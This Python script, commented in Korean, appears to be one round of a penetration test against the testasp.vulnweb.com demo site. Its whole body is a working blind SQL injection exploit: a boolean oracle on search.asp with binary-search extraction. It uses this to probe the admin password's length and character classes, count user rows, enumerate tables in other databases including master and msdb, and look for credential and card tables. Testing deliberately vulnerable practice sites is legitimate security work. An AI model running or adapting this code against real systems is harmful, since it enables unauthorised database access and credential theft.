#!/usr/bin/env python3
"""Round 8c — 측면 확장 확인: acublog / acuservice DB 접근 범위, admin 비밀번호 형식,
실 등록계정 수. 전부 읽기 전용 SELECT. 자격증명 '값'은 추출·기록하지 않는다."""
import json, urllib.parse, urllib.request, urllib.error

BASE = "http://testasp.vulnweb.com/search.asp"
REQ = {"n": 0}


def oracle(cond):
    st = "zzq')>0 OR (" + cond + "))--"
    url = BASE + "?tfSearch=" + urllib.parse.quote(st, safe="")
    REQ["n"] += 1
    try:
        with urllib.request.urlopen(url, timeout=30) as r:
            return "class='posttext'" in r.read().decode("latin-1", "replace")
    except urllib.error.HTTPError as e:
        b = e.read().decode("latin-1", "replace")
        return None if e.code == 500 else ("class='posttext'" in b)
    except Exception:
        return None


def exact_int(expr, lo=0, hi=200000):
    if oracle(f"({expr})>={lo}") is not True:
        return None
    while lo < hi:
        mid = (lo + hi + 1) // 2
        r = oracle(f"({expr})>={mid}")
        if r is True:
            lo = mid
        elif r is False:
            hi = mid - 1
        else:
            return None
    return lo


def extract(expr, n):
    out = ""
    for i in range(1, n + 1):
        lo, hi = 1, 126
        while lo < hi:
            mid = (lo + hi) // 2
            r = oracle(f"(SELECT ASCII(SUBSTRING(({expr}),{i},1)))>{mid}")
            if r is True:
                lo = mid + 1
            elif r is False:
                hi = mid
            else:
                return out + "<?>"
        if lo <= 1:
            break
        out += chr(lo)
    return out


def sget(expr, cap=60):
    if oracle(f"({expr}) IS NOT NULL") is not True:
        return None
    ln = exact_int(f"LEN({expr})", 1, cap)
    return extract(expr, ln) if ln else None


R = {}
print("### 1. admin 계정 비밀번호 형식 (값 미추출 — 형식만 판정)")
admin_checks = [
    ("길이 = 4", "(SELECT LEN(upass) FROM users WHERE uname='admin')=4"),
    ("소문자 포함", "(SELECT COUNT(*) FROM users WHERE uname='admin' AND upass LIKE '%[a-z]%')>0"),
    ("숫자 포함", "(SELECT COUNT(*) FROM users WHERE uname='admin' AND upass LIKE '%[0-9]%')>0"),
    ("대문자 포함", "(SELECT COUNT(*) FROM users WHERE uname='admin' AND upass LIKE '%[A-Z]%')>0"),
    ("특수문자 포함", "(SELECT COUNT(*) FROM users WHERE uname='admin' AND upass LIKE '%[^a-zA-Z0-9]%')>0"),
    ("전부 소문자", "(SELECT COUNT(*) FROM users WHERE uname='admin' AND upass NOT LIKE '%[^a-z]%')>0"),
    ("전부 소문자+숫자", "(SELECT COUNT(*) FROM users WHERE uname='admin' AND upass NOT LIKE '%[^a-z0-9]%')>0"),
    ("MD5(32hex) 형태 아님", "LEN((SELECT upass FROM users WHERE uname='admin'))<>32"),
]
R["admin_upass_format"] = {}
for lab, c in admin_checks:
    v = oracle(c); R["admin_upass_format"][lab] = v
    print(f"  {'TRUE ' if v else 'FALSE'}  {lab}")

print("\n### 2. 실 등록계정 규모")
for lab, e in [("email 에 @ 포함 행 수", "(SELECT COUNT(*) FROM users WHERE email LIKE '%@%')"),
               ("email 이 비어있지 않은 행 수", "(SELECT COUNT(*) FROM users WHERE LEN(email)>0)")]:
    v = exact_int(e, 0, 5000); R[lab] = v
    print(f"  = {v}   {lab}")
R["users_rows_again"] = exact_int("(SELECT COUNT(*) FROM users)", 0, 200000)
print("  users 총 행 수 =", R["users_rows_again"])

print("\n### 3. 다른 애플리케이션 DB 접근 범위 (측면 이동)")
for db in ["acublog", "acuservice", "master", "msdb"]:
    n = exact_int(f"(SELECT COUNT(*) FROM {db}.sys.tables)", 0, 2000)
    R[f"{db}_tables"] = n
    print(f"  {db}: 테이블 {n}개")
    names = []
    prev = ""
    for k in range(1, 6):
        cond = f"(SELECT MIN(name) FROM {db}.sys.tables WHERE name > '{prev}')"
        if oracle(f"{cond} IS NOT NULL") is not True:
            break
        ln = exact_int(f"LEN({cond})", 1, 40)
        if not ln:
            break
        nm = extract(cond, ln)
        names.append(nm); prev = nm.replace("'", "''")
        print(f"    [{k}] {nm}")
    R[f"{db}_table_names_sample"] = names

print("\n### 4. acublog / acuservice 에 자격증명류 테이블이 있나 (이름 기반)")
for db in ["acublog", "acuservice"]:
    for pat in ["users", "user", "login", "account", "members", "customer", "card", "credit"]:
        v = oracle(f"(SELECT COUNT(*) FROM {db}.sys.tables WHERE LOWER(name) LIKE '%{pat}%')>0")
        if v:
            print(f"  {db}: 이름에 '{pat}' 포함 테이블 존재")

print("\n### 5. 요약")
R["requests"] = REQ["n"]
with open("out/db_facts3.json", "w", encoding="utf-8") as f:
    json.dump(R, f, ensure_ascii=False, indent=2)
print(f"  총 요청 {REQ['n']}건 → out/db_facts3.json")
